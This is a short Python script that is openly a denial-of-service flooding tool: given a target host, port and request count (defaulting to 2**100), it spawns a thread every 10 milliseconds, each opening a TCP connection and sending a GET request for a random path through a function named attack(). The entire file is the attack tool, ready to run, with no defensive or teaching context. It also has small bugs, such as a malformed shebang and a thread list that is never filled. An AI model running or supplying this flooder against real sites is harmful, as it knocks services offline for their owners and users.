#!usr/bin/python3

import socket
import string
import time
import random
import sys
import threading

host = ''
port = 0
ip = ''
num_req = 0

if len(sys.argv) == 2:
	host = sys.argv[1].replace("http://", "").replace("https://", "").replace("www.", "")
	port = 80
	num_req = 2**100
elif len(sys.argv) == 3:
	host = sys.argv[1].replace("http://", "").replace("https://", "").replace("www.", "")
	port = sys.argv[2]
	num_req = 2**100
elif len(sys.argv) == 4:
	host = sys.argv[1].replace("http://", "").replace("https://", "").replace("www.", "")
	port = sys.argv[2]
	num_req = sys.argv[3]
else:
	print(f"Usage: {sys.argv[0]} < Host > < Port > < Number of requests > ")
	print("Default port: 80")
	print("Default number of requests: 1267650600228229401496703205376(2**100)")
	sys.exit(1)

ip = socket.gethostbyname(host)

thread_num = 0
thread_num_mutex = threading.Lock()

def print_status():
	global thread_num
	thread_num_mutex.acquire(True)
	thread_num += 1
	sys.stdout.write(f"\r[{thread_num}]")
	sys.stdout.flush()
	thread_num_mutex.release()

def generate_url_path():
	str_path = str(string.ascii_letters + string.digits + string.punctuation)
	data = "".join(random.sample(str_path, 5))
	return data

def attack():
	print_status()
	url_path = generate_url_path()
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((str(ip), int(port)))
	except ConnectionRefusedError:
		print("Maybe you enter incorect site name!!")
		sys.exit(2)
	byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
	s.send(byt)
	s.shutdown(socket.SHUT_RDWR)
	s.close()

all_thread = []
for i in range(num_req):
	t = threading.Thread(target=attack)
	t.start()
	time.sleep(0.01)
for x in all_thread:
	x.join()
